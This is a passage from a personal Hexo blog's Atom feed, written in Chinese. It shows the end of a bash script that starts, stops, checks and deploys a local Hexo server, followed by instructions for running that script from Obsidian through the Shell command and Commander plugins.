class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo is running...&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        hexo server &amp;</span><br><span class="line">        pid=$(ps aux | grep hexo | grep -v grep | grep -v hexo.sh | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Hexo is running... [<span class="variable">$pid</span>]&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署 hexo 到 GitHub</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">deploy_hexo</span></span>() &#123;</span><br><span class="line">    hexo clean</span><br><span class="line">    hexo deploy</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据命令行参数执行对应的操作</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">    <span class="string">&quot;status&quot;</span>)</span><br><span class="line">        check_status</span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;stop&quot;</span>)</span><br><span class="line">        stop_hexo</span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;restart&quot;</span>)</span><br><span class="line">        restart_hexo</span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;start&quot;</span>)</span><br><span class="line">        start_hexo</span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;deploy&quot;</span>)</span><br><span class="line">        deploy_hexo</span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;使用方法: <span class="variable">$0</span> [status|stop|restart|start|deploy]&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><h3 id="集成-Shell-command"><a href="#集成-Shell-command" class="headerlink" title="集成 Shell command"></a>集成 Shell command</h3><blockquote><p>依赖于 <a href="https://github.com/Taitava/obsidian-shellcommands">Shell command</a> 插件</p></blockquote><p>顶部导航栏选择 <strong>Environments</strong> 下方找到 <strong>Add directories to the PATH environment variable</strong>, 为 <code>hexo</code> 命令添加环境变量</p><p>Shell command 详细配置参考下面的图片 👇🏻</p><blockquote><p>这里需要将命令中顶部导航栏 <strong>Output</strong> -&gt; <strong>Output channel for stdout</strong> 设置为 Notification balloon</p></blockquote><p><img src="/../assets/hello-world/image-20230528_203843318.png" class="lazyload" data-srcset="/../assets/hello-world/image-20230528_203843318.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br><img src="/../assets/hello-world/image-20230528_203719961.png" class="lazyload" data-srcset="/../assets/hello-world/image-20230528_203719961.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>使用方法: Command + P 打开命令面板, 输入 hexo server, 回车后键入对应操作即可。也可以搭配 <a href="https://github.com/phibr0/obsidian-commander">Commander</a> 插件, 在左侧创建按钮更方便的管理。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Welcome to my blog. 👋 这是第一个帖子, 记录了这个站点的诞生。&lt;/p&gt;</summary>
    
    
    
    <category term="dev" scheme="https://blog.uuki.moe/categories/dev/"/>
    
    
    <category term="blog" scheme="https://blog.uuki.moe/tags/blog/"/>
    
  </entry>
  
</feed>
